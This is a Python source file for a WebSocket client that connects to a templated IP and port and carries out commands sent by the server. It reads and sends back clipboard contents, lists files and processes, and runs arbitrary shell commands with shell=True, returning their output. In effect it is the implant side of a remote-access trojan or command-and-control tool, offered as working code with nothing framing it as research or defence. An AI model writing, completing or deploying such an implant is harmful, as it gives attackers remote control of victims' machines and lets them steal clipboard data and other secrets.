import websocket
import json
import os
import subprocess
import pyperclip
import threading

# Send the result back to the server
def send_result(ws, result):
    response = {
        "status": "success",
        "result": result
    }
    ws.send(json.dumps(response))

def on_message(ws, message):
    print(f"Received message: {message}")
    command_data = json.loads(message)
    
    command = command_data.get('command')
    if command:
        handle_command(ws, command)

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws):
    print("Connection closed")

def on_open(ws):
    print("Connected to WebSocket server")

# Define the command handling functions
def list_files(ws):
    try:
        files = os.listdir('.')
        result = "\n".join(files)
        send_result(ws, result)
    except Exception as e:
        send_result(ws, f"Error listing files: {str(e)}")

def get_clipboard(ws):
    try:
        clipboard_content = pyperclip.paste()
        send_result(ws, clipboard_content)
    except Exception as e:
        send_result(ws, f"Error getting clipboard content: {str(e)}")

def download_file(ws, filename):
    try:
        if os.path.exists(filename):
            result = f"File {filename} is available for download."
        else:
            result = f"File {filename} not found!"
        send_result(ws, result)
    except Exception as e:
        send_result(ws, f"Error handling download: {str(e)}")

def upload_file(ws, filename):
    try:
        result = f"Uploading file: {filename} (not yet implemented)"
        send_result(ws, result)
    except Exception as e:
        send_result(ws, f"Error uploading file: {str(e)}")

def execute_command(ws, command):
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        send_result(ws, output)
    except subprocess.CalledProcessError as e:
        send_result(ws, f"Error executing command: {str(e)}")

def list_processes(ws):
    try:
        output = subprocess.check_output("ps -aux", shell=True, text=True)
        send_result(ws, output)
    except Exception as e:
        send_result(ws, f"Error listing processes: {str(e)}")

# Handle incoming commands
def handle_command(ws, command):
    if command == "list_files":
        list_files(ws)
    elif command == "get_clipboard":
        get_clipboard(ws)
    elif command.startswith("download_file "):
        download_file(ws, command.split(" ", 1)[1])
    elif command.startswith("upload_file "):
        upload_file(ws, command.split(" ", 1)[1])
    elif command.startswith("execute_command "):
        execute_command(ws, command.split(" ", 1)[1])
    elif command == "list_processes":
        list_processes(ws)
    else:
        send_result(ws, "Unknown command")

# Main entry point for the WebSocket client
if __name__ == "__main__":
    ip = "{ip}"
    port = "{port}"
    websocket_url = "ws://"+ip+":"+port+"/ws"  # Change to your WebSocket server URL
    ws = websocket.WebSocketApp(websocket_url,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    
    ws.on_open = on_open
    ws_thread = threading.Thread(target=ws.run_forever)
    ws_thread.start()

    try:
        while True:
            pass  # Keep the main thread alive
    except KeyboardInterrupt:
        ws.close()
        print("WebSocket client closed")
